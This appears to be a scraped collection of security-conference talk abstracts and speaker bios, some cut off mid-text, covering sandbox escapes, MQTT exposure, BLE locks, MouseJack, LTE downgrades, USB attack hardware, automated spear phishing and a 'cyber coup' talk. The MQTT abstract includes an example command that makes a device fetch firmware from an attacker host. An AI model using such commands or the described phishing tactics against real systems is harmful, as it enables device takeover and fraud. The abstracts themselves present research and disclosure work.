			"description": "The Remote Metamorphic Engine: Detecting, Evading, Attacking the AI and Reverse Engineering\nAmro Abdelgawad Founder, Immuneye\n\nAs a matter of fact, it is all about time to reverse engineer the most complex piece of code. Code complicity techniques are usually used just to increase the time and effort needed for reverse engineering. The desired effect of code complicity can be magnified using mechanisms that decrease and narrow the allowed time frame for any reverse engineering attempt into few milliseconds. Such approach can be applied using a metamorphic engine that is aware of the time dimension. Beyond metamorphic applications for AV evasion, in this talk, we will present a novel approach to resist and evade reverse engineering using a remote metamorphic engine that generates diversified morphed machine code of a very short expiration lifetime. Our approach is based on a client-server model using challenge-response communication protocol made of morphed machine code rather than data. We will show how any reverse engineering attempt on such model will be forced to execute or emulate the morphed code. Thus the code will always have an upper hand to detect, evade and attack the reverse engineering environment. Our approach is immune to static code analysis as the functionalities and the communication protocol used are dynamically diversified remotely and do not exist in packed executable files. On the other hand, clock synchronized morphed machine code driven by a remote metamorphic engine would trap dynamic RE attempts in the maze of metamorphism. One that is immune to code tampering and reversing by detecting the non-self. We will present the fundamental difference between metamorphic and polymorphic techniques used to evade AV compared to the ones that can be used to resist RE. We will show how a remote diversified metamorphic self-modifying code with a very short expiration lifetime can detect, evade, and resist any code analysis, reverse engineering, machine learning and tampering attempts.\n\nAmro Abdelgawad is a security researcher and the founder of Immuneye. He has more than 15 years experience in software security and reverse engineering. He has experienced both sides of software security in vulnerability researching, penetration testing, reverse engineering, exploit development and the defensive side as a chief security officer for software companies running wide infrastructures. Amro is currently working as a security researcher where his main interests are analyzing malware, vulnerability researching and developing artificial software immunity.",

By pretending to be a controller connected to a game console, TASBot triggers glitches and exploits weaknesses to execute arbitrary opcodes and rewrite games. This talk will cover how these exploits were found and will explore the idea that breaking video games using Tool-Assisted emulators can be a fun way to learn the basics of discovering security vulnerabilities. After a brief overview of video game emulators and the tools they offer, I'll show a live demo of how the high accuracy of these emulators makes it possible to create a frame-by-frame sequence of button presses accurate enough to produce the same results even on real hardware. After demonstrating beating a game quickly I'll show how the same tools can be used to find exploitable weaknesses in a game's code that can be used to trigger an Arbitrary Code Execution, ultimately treating the combination of buttons being pressed as opcodes. Using this ability, I'll execute a payload that will connect a console directly to the internet and will allow the audience to interact with it. An overview of some of the details that will be described in the talk can be found in an article I coauthored for the PoC||GTFO journal (Pokemon Plays Twitch, page 6 ).\n\nAllan Cecil (dwangoAC) is the President of the North Bay Linux User's Group. He acts as an ambassador for Tasvideos.org, a website devoted to using emulators to complete video games as quickly as the hardware allows.

As teledildonics come into the mainstream, human sexual pleasure has become connected with the concerns of privacy and security already familiar to those who previously only wanted to turn on their lights, rather than their lover. Do you care if someone else knows if you or your lover is wearing a remote control vibrator? Do you care if the manufacturer is tracking your activity, sexual health and to whom you give control? How do you really know who is making you squirm with pleasure? And what happens when your government decides your sex toy is an aid to political dissidents? Because there’s nothing more sexy than reverse engineering we looked into one product (the We-Vibe 4 Plus from the innocuously named “Standard Innovation Corporation”) to get answers for you.\n\nAttend our talk to learn the unexpected political and legal implications of internet connected sex toys and, perhaps more importantly, how you can explore and gain more control over the intimate devices in your life. Learn the reverse engineering approach we took--suitable for both first timers and the more experienced--to analyze a product that integrates a Bluetooth LE/Smart wireless hardware device, mobile app and server-side functionality. More parts means more attack surfaces! Alongside the talk, we are releasing the “Weevil” suite of tools to enable you to simulate and control We-Vibe compatible vibrators. We invite you to bring your knowledge of mobile app exploits, wireless communication hijacking (you already hacked your electronic skateboard last year, right?) and back-end server vulnerabilities to the party. It’s time for you to get to play with your toys more privately and creatively than before. \n\nPlease note: This talk contains content related to human sexuality but does not contain sexually explicit material.

This generally requires access to an execution environment capable of supporting the machine code being studied, both at an architectural level (CPU type) and a packaging level (file container type). Unfortunately, this is not always a simple matter. The majority of analysts do not have a full complement of hosts available to support a wide variety of architectures, and virtualization opportunities for non-intel platforms are limited. In this talk we will discuss a light weight emulator framework for the IDA Pro disassembler that is based on the Unicorn emulation engine.

With almost all of the emphasis is placed around the endless cycle of new entry points, we are often overlooking what is perhaps one of the most profoundly interesting aspects of modern network breaches; the post-exploit communication of a compromised system to the attacker—known as command and control. \n\nOnce malware has compromised an end system, the tables are turned against the attackers; we go from being on defense, to being on offense. Attackers are constantly evolving their techniques and have become incredibly creative in attempting to hide their tracks, maintain control of compromised systems, and exfiltrate sensitive data.

This time it’s bigger and badder than before.\n\nAre you sick and tired of your government? Can’t wait another 4 years for an election? Or do you want to be like the CIA and overthrow a government overseas for profit or fun? If you answered yes to one or more of these questions than this talk is for you! Why not create your own cyber mercenary unit and invoke a regime change to get the government you want installed? After all, if you want the job done right, sometimes you have to do it yourself. \n\nFind out how over the last 60 years, governments and resource companies have been directly involved in architecting regime changes around world using clandestine mercenaries to ensure deniability. This has been achieved by destabilizing the ruling government, providing military equipment, assassinations, financing, training rebel groups and using government agencies like the CIA, Mossad and MI-5 or using foreign private mercenaries such as Executive Order and Sandline. Working with Simon Mann an elite ex SAS soldier turned coup architect who overthrew governments in Africa, Chris Rock will show you how mercenary coup tactics directly applied to digital mercenaries to cause regime changes as the next generation of “Cyber Dogs of War”. \n\nChris will walk you through a cyber regime change from start to finish on a real country and show you how to architect a coup achieving the same result as a traditional mercenary operation without any blood spilt. This will include taking ownership of all facets of government including finance, telecommunications, transportation, commercial companies and critical infrastructure such a power, water and oil. You will learn:\n• Traditional military mercenary coup tactics used by the infamous 32 Battalion in Africa, Executive Order and Sandline that can be directly applied to a cyber mercenary regime change.\n• How to architect a cyber coup using advisor’s, hackers and the general populace, using misinformation, professional agitators, false information and financing.\n• How to gather intelligence to analyze a government’s systemic weaknesses on financial, societal values and political climates that is leader or country specific to structure your attack.\n• How to identify and prioritize government resources, infrastructure and commercial companies and how to use these compromised assets to stage the coup.\n• Combine physical and digital techniques and have the best of both worlds to own a countries infrastructure.\n• Hot to manipulate the media using propaganda targeting journalists flawed multiple “source” rules for a story.\n• The Grand finale of a cyber regime change on a real country from beginning to end using the above techniques with operational footage. Come to this talk and find out how you too can be your own dictator, benevolent or merciless that part is up to you.\n\nChris Rock presented “I will kill you” at DEF CON 23 has been active in the security industry for the last 20 years and is the founder and CEO of Kustodian, a specialized security company that specializes in Security Operations Centres, Penetration testing and independent research.

While the concept isn't new, practical tools for developing MCRs don't currently exist. Erez Metula released ReFrameworker in 2010 with the ability to inject attack modules into the C# runtime, paving the way for MCRs, but the tool requires the attacker to have knowledge of intermediate languages, does not support other runtimes, and is no longer maintained. Worse yet, the ‘write once, run anywhere’ motto of managed languages is violated when dealing with runtime libraries, forcing the attacker to write new exploits for each target platform. \n\nThis talk debuts a free and open source tool called JReFrameworker aimed at solving the aforementioned challenges of developing attack code for the Java runtime while lowering the bar so that anyone with rudimentary knowledge of Java can develop a managed code rootkit. With Java being StackOverflow's most popular server side language of 2015 the Java runtime environment is a prime target for exploitation. JReFrameworker is an Eclipse plugin that allows an attacker to write simple Java source to develop, debug, and automatically modify the runtime. Best of all, working at the intended abstraction level of source code allows the attacker to ‘write once, exploit anywhere’. When the messy details of developing attack code are removed from the picture the attacker can let his creativity flow to develop some truly evil attacks, which is just what this talk aims to explore.\n\nBen Holland is a PhD student at Iowa State University with experience working on two high profile DARPA projects. He has extensive experience writing program analyzers to detect novel and sophisticated malware in Android applications and served on the ISU team as a key analyst for DARPA's Automated Program Analysis for Cybersecurity (APAC) program. He's lectured on security topics for university courses in program analysis and operating system principles. Ben has given multiple talks at professional clubs as well as security and academic conferences. His past work experience has been in research at Iowa State University, mission assurance at MITRE, government systems at Rockwell Collins, and systems engineering at Wabtec Railway Electronics.

			"description": "Escaping The Sandbox By Not Breaking It\nMarco Grassi KEENLAB of Tencent\nQidan He KEENLAB of Tencent\n\nThe main topic of this technical talk will be “sandboxes” and how to escape them. One of the main component of the modern operating systems security is their sandbox implementation. Android for example in recent versions added SELinux to their existing sandbox mechanism, to add an additional layer of security. As well OS X recently added System Integrity Protection as a ‘system level’ sandbox, in addition to the regular sandbox which is ‘per-process’.\n\nAll modern OS focus on defense in depth, so an attacker and a defender must know these mechanisms, to bypass them or make them more secure. We will focus on Android and iOS/OSX to show the audience the implementations of the sandbox in these operating systems, the attack surface from within interesting sandboxes, like the browser, or applications sandbox.\n\nThen we will discuss how to attack them and escape from our restricted context to compromise further the system, showcasing vulnerabilities. We think that comparing Android with iOS/OSX can be very interesting since their implementation is different, but the goal for attackers and defenders is the same, so having knowledge of different sandboxes is very insightful to highlight the limitations of a particular implementation. The sandboxes some years ago were related mainly to our desktop, mobile phone or tablet. But if we look now at the technology trend, with Automotive and IOT, we can understand that sandboxes will be crucial in all those technologies, since they will run on mainstream operating system when they will become more popular.\n\nMarco Grassi is currently a Senior Security Researcher of the KEEN Lab of Tencent (previously known as KEEN Team). He was one of the main contributors at Pwn2Own 2016 for the Safari target with sandbox escape to root. He is a member of the team who won the title of ‘Master Of Pwn’ at Pwn2Own 2016. Formerly he was a member of NowSecure R&D Team, where he researched solutions for mobile security products and performed reverse engineering, pentesting and vulnerability research in mobile OS applications and devices. When he’s not poking around mobile devices, he enjoys developing embedded and electronic systems. He has spoken at several international security conferences such as ZeroNights, Black Hat, Codegate, HITB and cansecwest. \n\nTwitter: @marcograss \n\nQidan He (a.k.a Edward Flanker) is a security researcher focusing on mobile security at KeenLab of Tencent (former known as Keen Team). His major experience includes Android/iOS/OSX security and program analysis. He has reported several vulnerabilities in Android system core components, which were confirmed and credited in multiple advisories. He has also found multiple vulnerabilities in OSX kernel, which are awaiting patch and credit. He is the winner of Pwn2Own 2016 OSX Category and member of Master of Pwn Champion team.

Despite the continued popularity of these single-cup coffee conjurers at home as well as in the workplace, it has become clear that these devices are not impervious to mechanical and/or electrical failure. It was this intersection of extremely prevalent hardware and relatively short lifespan that prompted me to begin exploring the upper limits of what could be created by repurposing one of the most popular pod-based machines: the Keurig. In this session, we will walk through some real-world examples of ‘MacGyver’-style creative problem-solving, we'll go hands on (yes, pun intended) with stuff made from repurposed Keurigs, and finally, I'll reflect on lessons learned from looking for potential in things most people deem common and unremarkable.\n\nEvan Booth loves to build stuff out of other stuff. As an engineer for Skookum, a full service software development company in Charlotte, North Carolina, he works to solve a variety of business problems through the creative use of technology. As a human for Earth, he tends to break things for curiosity's sake. Throughout 2013 and into 2014, in an effort to highlight hypocrisy and ‘security theater’ brought about by the TSA, through a research project called ‘Terminal Cornucopia,’ Evan created an arsenal ranging from simple, melee weapons to reloadable firearms to remotely-trigger incendiary suitcases—all solely comprised of items that anyone can purchase inside most airport terminals *after* the security checkpoint. Given the right ingredients, a big cardboard box can be a time machine, spaceship, minecart, or a telephone booth that only calls people named ‘Steve’ who live in the future. \n\nTwitter: @evanbooth",

Critical Implications!\nLucas Lundgren Senior Security Consultant, FortConsult (Part of NCC Group)\nNeal Hindocha Principal Consultant, FortConsult (Part of NCC Group)\n\nThe presentation will begin by discussing the protocol (http://mqtt.org/) and results from a simple query on shodan, showing the number of servers directly available on the internet. We will then go through the protocol specifications which shows that security is more or less non-existent. We are able to directly connect to many of the servers which are open to the internet, and following protocol specifications, see what devices they are communicating with.\n\nWe will show how its possible to extract data on all subscriptions available on the server using a ruby script, which basically gives a detailed list of the devices. However, it is not only the list of devices we are getting. The data returned by our script also contains things like session tokens (for web pages), social security numbers, phone numbers, names and other sensitive data used for one purpose or another in the communication to and from the devices. \n\nWe will show how messages can be posted into the message queues and in turn received by the devices that subscribe to the various queues. This means that we are able to issue commands targeting the range of devices we have discovered, that use this protocol. We have however also discovered that this is not limited to messages and commands, if supported by the device, we can actually issue firmware updated, simply by sending something similar to “FIRMWAREUPDATEHERE:http://www.attacker.com/filename.bin”.\n\nA specific example of what we can see and do is a home automation system we discovered. We got a list of every sensor and its status. Furthermore, we got exact GPS coordinates from the mobile app used to control the home automation. So in this case, not only were we able to control the system, we even knew when the owner was away.\n\nThe talk will move on to show various implementations where webclients and SQL servers are hooked in. Much of the communication data is stored in various databases, and because we have access, we can use MQTT to attack the database and web servers. \n\nMultiple tools have been developed by us already to support testing the protocol and fuzzing endpoints. we will show the tools used in various demos and release them at the end of the talk! These tools are currently scripts containing various protocol implementations, that can be used to target servers and extract, or inject, data. We also have a small client that implements all interesting areas of the protocol which we use for server-to-client testing.\n\nWe believe this talk is going to have a significant impact on MQTT and anyone who uses it. This is an old protocol from 1999. Its fast and reliable, but its missing security. \n\nWe also be believe this talk will trigger a discussion about light-weight IoT protocols and security, which is much needed at this point in time.\n\nLucas Lucas has a vast experience in IT security, with the \"bad luck\" (or tendency) to annoy companies by reporting vulnerabilities in their products.\n\nLucas started breaking things at the age of twelve, and has reported numerous vulnerabilities in various products.\n\nHaving worked with penetration testing professionally for over 12 years, Lucas has held IT Security positions within companies such as Sony Ericsson and IOActive. He has also been part of Corelan Team before moving on to FortConsult (Part of NCC Group) \n\nLucas has been breaking everything from OS vendors and financials, and he has spent a considerable amount of time inside \"impenetrable fortresses\".\n\nLucas is primarily focusing on penetration testing as well as fuzzing and exploit development, no matter the platform or medium, were he also has a passion for IoT and Smart Technology.\n\nNeal Hindocha has been working in the security industry since 1999. He began his work at Symantec, reverse engineering malware and writing signature for Symantec's antivirus products. From there, he moved on to penetration testing, and has since been a consultant for Verizon Business and Trustwave, where he helped build the mobile testing services and focused on deliveries for advanced projects.\n\nCurrently, Neal is a Principal Consultant at FortConsult (part of NCC Group), focusing on new service areas such as cloud and IoT, whilst still reversing the odd malware and delivering pentests.",

These devices promise convenience and security through smartphone control. We investigated sixteen of these products from multiple vendors and discovered wireless vulnerabilities in most of them. Using a $50 antenna, we successfully picked vulnerable locks from over 400 meters away. In this presentation we introduce open source tools to crack each of the vulnerable BLE locks. Furthermore, after surveying the open source Bluetooth hacking tools currently available, we find very little support for BLE. So, to make discovering and range finding to BLE devices easier, we introduce a new open source war-walking tool compatible with both Bluetooth Classic and BLE.\n\nAnthony Rose is an electrical engineer with five years of network security experience.

With widely available books and other training resources targeting the smallest set of prerequisites, in order to attract the largest audience, many penetration testers adopt the techniques used in simplified examples to real world tests, where the network environment can be much more dangerous. Malicious threat actors are incentivized to attack and compromise penetration testers, and given current practices, can do so easily and with dramatic impact.\n\nThis presentation will include a live demonstration of techniques for hijacking a penetration tester's normal practices, as well as guidance for examining and securing your current testing procedures.

The trouble with VNC is that it was invented 15+ years ago and hasn't been improved upon in any significant way. Besides the internet of things being sprinkled with VNC endpoints, there are companies which use VNC to such a large degree they need a VNC proxy on their perimeter to get to all the internal VNC hosts - some of which are ICS/SCADA devices. Stargate is the result of discovering a vulnerability in these VNC proxies that allows you to proxy basically anything. This allows you to do anything from using them as anonymous proxies, conduct reflective scanning, pivoting into the internal network behind it, and more. In this presentation we will show you exactly what Stargate is, how we encountered it, the 'fun' things you can do with the Stargates all around the globe and we will release the Stargate tool which anyone can use to talk to/through these devices.\n\nYonathan Klijnsma is a senior threat intelligence analyst working for Fox-IT, a Dutch IT security company.

This is welcomed as the CAN protocol is becoming the backbone for embedded computers found in smartcars. Its use is now even spreading outside the car through the OBD-II connector: usage-based policies from insurance companies, air-pollution control from law enforcement or engine diagnostics from smartphones for instance. Nonetheless, these tools will do no more than what professional tools from automobile manufacturers can do. In fact, they will do less as they do not have knowledge of upper-layer protocols. Security auditors are used to deal with this kind of situation: they reverse-engineer protocols before implementing them on top of their tool of choice. However, to be efficient at this, they need more than just being able to listen to or interact with what they are auditing. Precisely, they need to be able to intercept communications and block them, forward them or modify them on the fly. This is why, for example, a framework such as Burp Suite is popular when it comes to auditing web applications. In this paper, we present CANSPY, a framework giving security auditors such capabilities when auditing CAN devices. Not only can it block, forward or modify CAN frames on the fly, it can do so autonomously with a set of rules or interactively using Ethernet and a packet manipulation framework such as Scapy.\n\nIt is also worth noting that it was designed to be cheap and easy to build as it is mostly made of inexpensive COTS. Last but not least, we demonstrate its versatility by turning around a security issue usually considered when it comes to cars: instead of auditing an electronic control unit (ECU) through the OBD-II connector, we are going to partially emulate ECUs in order to audit a device that connects to this very connector.\n\nJonathan-Christofer Demay, PhD is the current penetration testing team leader at AIRBUS Defence and Space. As a former academic researcher, he has been working on IDS bypassing, intrusion detection and general network security. Now a consultant for various key industries and government bodies, he is working on incident response, penetration testing and social engineering. \n\nArnaud Lebrun is a command and control engineer currently working at AIRBUS Defence and Space.

Then -- and only then -- we can look back and see the path we took in its entirety. But that may not be the only, nor shortest path we could have taken. By combining our concept of derivative admin (the chaining or linking of administrative rights), existing tools, and graph theory, we can reveal the hidden and unintended relationships in Active Directory domains. \n\nBob is an admin on Steve’s system, and Steve is an admin on Mary’s system; therefore, Bob is effectively (and perhaps unintentionally) an admin on Mary’s system. While existing tools such as Nmap, PowerView, CrackMapExec, and others can gather much of the information needed to find these paths, graph theory is the missing link that gives us the power to find hidden relationships in this offensive data. The application of graph theory to an Active Directory domain offers several advantages to attackers and defenders. Otherwise invisible, high-level organizational relationships are exposed. All possible escalation paths can be efficiently and swiftly identified. Simplified data aggregation accelerates blue and red team analysis. Graph theory has the power and the potential to dramatically change the way you think about and approach Active Directory domain security.\n\nAndy Robbins is the Offensive Network Services lead for Veris Group's Adaptive Threat Division.

The attacker is camped out at the other end of the terminal, equipped with a commodity USB radio dongle and a directional patch antenna hidden in a backpack, and boards her plane as soon as the deed is done. The reality of MouseJack is that an attacker can inject keystrokes into your wireless mouse dongle from over 200 meters away, at a rate of up to 7500 keystrokes per minute (one every 8ms). \n\nMost wireless keyboards encrypt the data going between the keyboard and computer in order to deter sniffing, but wireless mouse traffic is generally unencrypted. The result is that wireless mice and keyboards ship with USB dongles that can support both encrypted and unencrypted RF packets. A series of implementation flaws makes it possible for an attacker to inject keystrokes directly into a victim's USB dongle using easily accessible, cheap hardware, in most cases only requiring that the user has a wireless mouse. The majority of affected USB dongles are unpatchable, making it likely that vulnerable computers will be common in the wild for the foreseeable future. \n\nThis talk will explain the research process that lead to the discovery of these vulnerabilities, covering specific tools and techniques. Results of the research will be detailed, including protocol behavior, packet formats, and technical specifics of each vulnerability. Additional vulnerabilities affecting 14 vendors are currently in disclosure, and will be revealed during this talk.\n\nMarc is a security researcher and software engineer at Bastille Networks, where he focuses on RF/IoT threats present in enterprise environments.

Schannel has been the subject of scrutiny in the past several years from an external perspective due to reported vulnerabilities, including a RCE. \n\nWhat about the internals? How does Schannel guard its secrets? This talk looks at how Schannel leverages Microsoft's CryptoAPI-NG (CNG) to cache the master keys, session keys, private and ephemeral keys, and session tickets used in TLS/SSL connections. It discusses the underlying data structures, and how to extract both the keys and other useful information that provides forensic context about connection. This information is then leveraged to decrypt session that use ephemeral cipher suites, which don't rely on the private key for decryption. Information in the cache lives for at least 10 hours by default on modern configurations, storing up to 20,000 entries for client and server each. This makes it forensically relevant in cases where other evidence of connection may have dissipated.\n\nJake Kambic is a DFIR researcher and network penetration tester\n\nTwitter: @TinRabbit",

Offense can benefit from data just as well. Social networks, especially Twitter with its access to extensive personal data, bot-friendly API, colloquial syntax and prevalence of shortened links, are the perfect venues for spreading machine-generated malicious content. We present a recurrent neural network that learns to tweet phishing posts targeting specific users. The model is trained using spear phishing pen-testing data, and in order to make a click-through more likely, it is dynamically seeded with topics extracted from timeline posts of both the target and the users they retweet or follow. We augment the model with clustering to identify high value targets based on their level of social engagement such as their number of followers and retweets, and measure success using click-rates of IP-tracked links. Taken together, these techniques enable the world's first automated end-to-end spear phishing campaign generator for Twitter.\n\nJohn Seymour is a Data Scientist at ZeroFOX, Inc. by day, and Ph.D. student at University of Maryland, Baltimore County by night. He researches the intersection of machine learning and InfoSec in both roles. He's mostly interested in avoiding and helping others avoid some of the major pitfalls in machine learning, especially in dataset preparation (seriously, do people still use malware datasets from 1998?)

			"description": "Universal Serial aBUSe: Remote Physical Access Attacks\nRogan Dawes Researcher, Sensepost\nDominic White CTO, SensePost\n\nIn this talk, we’ll cover some novel USB-level attacks, that can provide stealthy remote access to a machine’s console, and release a toolset using freely available hardware. In 2000, Microsoft published its 10 Immutable laws of security. One of which was ‘if a bad guy has unrestricted access to your computer, it's not your computer anymore.’ This has been robustly demonstrated over the years. Examples include numerous DMA-access attacks against interfaces such as firewire, PCMCIA and thunderbolt as well as USB-based attacks including simple in-line keyloggers, ‘evil maid‘ attacks and malicious firmware. Despite these warnings, groups such as the NSA were still able to use physical access to bypass software controls with toolsets such as COTTONMOUTH. Likewise, criminals have been able to defraud banks with a handful of simple hardware tricks. While some progress has been made to secure some devices against some threats, such as the use of full disc encryption, or the impact of Apple's secure enclave in the physical security of the iPhone, most laptops and desktops remain vulnerable to attacks via physical interfaces. In our experience, organizations merely view USB devices as a channel for malware or unsanctioned communications, and rely on protections placed elsewhere in their defensive stack to deal with them, but few deal with the risk the USB interface presents directly. There are many scenarios where gaining physical access to hosts is plausible, and having done so can provide access to ‘chewy’ internal networks ripe for lateral movement. While most people are familiar with USB devices, many don't realize the extent to which the USB standard allows seemingly innocuous devices to have multiple personalities. The most common attack is to have devices implement keyboard and mouse functionality, allowing an attacker to execute a pre-programmed sequence of keystrokes and mouse movements at some point after the device has been plugged in. An implementation of this is commercially available in the form of the ‘Rubber Ducky‘ device (limited to keystroke injection only) or the USBdriveby toolset (keystroke and mouse movement injection). However, these attacks are ‘send only’ and usually rely on the executed payload and the host’s networks for any advanced remote access. These payloads can leave a significant forensic footprint in the form of network communications and on-host behaviors, with numerous companies improving toolsets to detect such attacks. Lastly, these attacks are often lsquo;spray and pray’, unable to account for variations in the user's behavior or computer setup. For example, what happens if the user plugs in the device while the screen is locked, and how would you know what the cause of the failure was? Our approach is to create a stealthy bi-directional channel between the host and device, with remote connectivity via 3G/Wi-Fi and offload the complexity to our hardware, leaving a small simple stub to run on the host. This talk will discuss the process of creating a set of malicious USB devices using low cost hardware. The design and toolkit will be released during the talk. Our toolkit provides three significant improvements over the common USB attacks. The first is the ability to gain a bi-directional channel with the host via the device with no traffic generated on the target network. This is done via the use of either a standard USB class printer or audio device driver linked to our device, with the stub merely wrapping commands and outputs encoded as audio or print instructions. The second is the ability to communicate with the device remotely via Wi-Fi/3G, allowing for updates to the payloads, exfiltration of data, real-time interaction with the host and an ability to debug problems. This also has the advantage that any network controls are bypassed. Finally, the stub running on the host will leave a minimal forensic trail, making detection of the attack, or analysis of it later, difficult. Our hope is that the tools will provide a method of demonstrating the risk of physical bypasses of software security without an NSA budget, and encourage defenses to be built in this area.\n\nRogan Dawes is a senior researcher at SensePost and has been hacking since 1998, which, coincidentally, is also the time he settled on a final wardrobe.

Remote cyber intrusions at three Ukrainian regional electric power distribution companies in December 2015 left approximately 225,000 customers without power. Malware, like BlackEnergy, is being specially developed to target supervisory control and data acquisition (SCADA) systems. Specifically, adversaries are focusing their efforts on obtaining access to the human-machine interface (HMI) solutions that act as the main hub for managing the operation of the control system. Vulnerabilities in these SCADA HMI solutions are, and will continue to be, highly valuable as we usher in this new era of software exploitation. This talk covers an in-depth analysis performed on a corpus of 200+ confirmed SCADA HMI vulnerabilities. It details out the popular vulnerability types discovered in HMI solutions developed by the biggest SCADA vendors, including Schneider Electric, Siemens, General Electric, and Advantech. It studies the weaknesses in the technologies used to develop HMI solutions and describes how critical vulnerabilities manifest in the underlying code. The talk will compare the time-to-patch performance of various SCADA vendors along with a comparison of the SCADA industry to the rest of the software industry. Finally, using the data presented, additional guidance will be provided to SCADA researchers along with a prediction on what we expect next in attacks that leverage SCADA HMI vulnerabilities.\n\nBrian Gorenc is the senior manager of Vulnerability Research with Trend Micro.

Detection methods haven't evolved to be as fast and easy to implement. Wireless situational awareness has a number of challenges. Categorically, these challenges are usually classified under Time, Money, or a lot of both. Provisioning sensors takes time, and the fast stuff usually isn’t cheap. Iterative improvements compound the problem when you need to get software updates to multiple devices in the field. I’ll present a prototype platform for GSM anomaly detection (called SITCH) which uses cloud-delivered services to elegantly deploy, manage, and coordinate the information from many independent wireless telemetry sensors (IoT FTW). We’ll talk about options and trade-offs when selecting sensor hardware, securing your sensors, using cloud services for orchestrating firmware, and how to collect and make sense of the data you’ve amassed.

Recently there already some papers those exposed the vulnerabilities of LTE network. In this presentation, we will introduce one method which jointly exploits the vulnerabilities in tracking area update procedure, attach procedure, and RRC redirection procedure, and finally can force a targeted LTE cellphone to downgrade into a malicious GSM network, then consequently can eavesdrop its data traffic or even voice call. This attack is not a simple DoS attack. It can select the targeted cellphone by filtering the IMSI number (IMSI catcher function), so it will not influence the other cellphones and keep them still in the real network. Further more, it can force the cellphone into the malicious network that we setup (a fake network) or we assign (operator’s network), therefore the cellphone has no chance to choose other secure network. This is the danger point of this attack.\n\nHaiqi Shan, currently a wireless/hardware security researcher in Unicorn Team.

			"description": "Playing Through the Pain? - The Impact of Secrets and Dark Knowledge on Security and Intelligence Professionals\nRichard Thieme ThiemeWorks\n\nDismissing or laughing off concerns about what it does to a person to know critical secrets does not lessen the impact when those secrets build a different map of reality than “normals” use and one has to calibrate narratives to what another believes. The cognitive dissonance that inevitably causes is managed by some with denial who live as if refusing to feel the pain makes it disappear. But as Philip K. Dick said, reality is that which, when you no longer believe in it, refuses to go away. And when cognitive dissonance evolves into symptoms of traumatic stress, one ignores those symptoms at one's peril. But the constraints of one's work often make it impossible to speak aloud about those symptoms, because that might threaten one's clearances, work, and career. The real cost of security work and professional intelligence goes beyond dollars. It is measured in family life, relationships, and mental and physical well-being. \n\nThe divorce rate is as high among intelligence professionals as it is among medical professionals, for good reason - how can relationships be based on openness and trust when one's primary commitments make truth-telling and disclosure impossible?\n\nRichard Thieme has been around that space for years. He has listened to people in pain because of the compelling necessities of their work, the consequences of their actions, the misfiring of imperfect plans, and the burdens of - for example - listening to terrorists slit someone's throat in real time, then having to act as if they had a normal day at the office. Thieme touched on some of this impact in his story, “Northward into the Night,” published in the Ranfurly Review, Big City Lit, Wanderings and Bewildering Stories before collection in “Mind Games.” The story illuminates the emotional toll of managing multiple personas and ultimately forgetting who you are in the first place. \n\nThe bottom line is, trauma and secondary trauma have identifiable symptoms and they are everywhere in the “industry.” The “hyper-real” space which the national security state creates by its very nature extends to normals, too, now, but it's more intense for professionals. Living as “social engineers,” always trying to understand the other's POV so one can manipulate and exploit it, erodes the core self. The challenge is not abstract or philosophical, it's existential, fired into our faces every day at point blank range, and it constitutes an assault on authenticity and integrity. Sometimes sanity is at stake, too, and sometimes, life itself. In one week, two different people linked to the CIA told Thieme that going into that agency was like becoming a scientologist. Think about what that analogy means. For his own sake and sanity, Thieme has thought about it a lot and that's what this talk is about - the real facts of the matter and strategies for effective life-serving responses.\n\nRichard Thieme is an author and professional speaker focused on the challenges posed by new technologies and the future, how to redesign ourselves to meet these challenges, and creativity in response to radical change. His column, ‘Islands in the Clickstream,’ was distributed to subscribers in sixty countries before collection as a book in 2004. When a friend at the National Security Agency said after they worked together on ethics and intelligence issues, ‘The only way you can tell the truth is through fiction,’ he returned to writing short stories, 19 of which are collected in “Mind Games.” \n\nHis latest work is the stunning novel “FOAM,” published by Exurban Press September 2015. He is also co-author of the critically extolled “UFOs and Government: A Historical Inquiry,” a 5-year research project using material exclusively from government documents and other primary sources, now in 65 university libraries His work has been taught at universities in Europe, Australia, Canada, and the United States, and he has guest lectured at numerous universities, including Purdue University (CERIAS), the Technology, Literacy and Culture Distinguished Speakers Series of the University of Texas, the “Design Matters” lecture series at the University of Calgary, and as a Distinguished Lecturer in Telecommunications Systems at Murray State University. \n\nHe addressed the reinvention of “Europe” as a “cognitive artifact” for curators and artists at Museum Sztuki in Lodz, Poland, keynoted CONFidence in Krakow 2015, and keynoted “The Real Truth: A World’s Fair” at Raven Row Gallery, London, He recently keynoted Code Blue in Tokyo. He loved Tokyo. He has spoken for the National Security Agency, the FBI, the Secret Service, the US Department of the Treasury, and Los Alamos National Labs and has keynoted “hacker,”security, and technology conferences around the world.

We’ve all been there on our first professional phishing exercise. What should be as easy as building a two page web site and writing a clever e-mail turns into a massively frustrating exercise with a centi-scaled corpus of captured credentials. In this talk, we’ll tell you how to win at phishing, from start to finish, particularly in hacking Layer 8, the “Politics” layer of the OSI stack that’s part of any professional phishing engagement.

Finally, we’ll tell you how we stopped feeling frustrated, learned to handle the politics, and produced successful phishing campaigns that hardened organizations at the human layer, and started to screw things up for the bad actors.\n\nJay Beale has created several security tools, including Bastille Linux/UNIX and the CIS Linux Scoring Tool, both of which have been used throughout industry and government.

Attribution Analysis Through Arrest History\nJake Kouns CISO, Risk Based Security\n\nThere have been over 20,000 data breaches disclosed exposing over 4.8 billion records, with over 4,000 breaches in 2015 alone. It is clear there is no slowdown at all and the state of security is embarrassing. The total cybercrime cost estimates have been astronomical and law enforcement has been struggling to track down even a fraction of the criminals, as usual. \n\nAttribution in computer compromises continues to be a surprisingly complex task that ultimately isn’t definitive in most cases. Rather than focusing on learning from security issues and how companies can avoid these sorts of data breaches in the future, for most media outlets the main topic after a breach continues to be attribution. And if we are honest, the media have painted an “interesting” and varied picture of “hackers” over the years, many of which have caused collective groans or outright rage from the community. \n\nThe Arrest Tracker project was started in 2011 as a way to track arrests from all types of “cyber” (drink!) and hacking related incidents. This project aims to track computer intrusion incidents resulting in an arrest, detaining of a person or persons, seizure of goods, or other related activities that are directly linked to computer crimes. \n\nThe Arrest Tracker project currently has 936 arrests collected as of 4/23/2016. How does tracking this information help and what does the data tell us? A lot actually! Who is behind these data breaches and what are the demographics such as average age, gender, and nationality? Which day of the week are you most likely to be arrested? How many arrests lead to assisting authorities to arrest others? How many work by themselves versus part of a group? These observations, and a lot more, paint an interesting picture of the computer crime landscape.\n\nJake Kouns is the CISO for Risk Based Security that provides vulnerability and data breach intelligence. He has presented at many well-known security conferences including DEF CON , Black Hat, DerbyCon, FIRST, CanSecWest, RSA, SOURCE, SyScan and many more. He is the co-author of the book Information Technology Risk Management in Enterprise Environments, Wiley, 2010 and The Chief Information Security Officer, IT Governance, 2011. With all of that said, many people are shocked to find out that he has a CISO 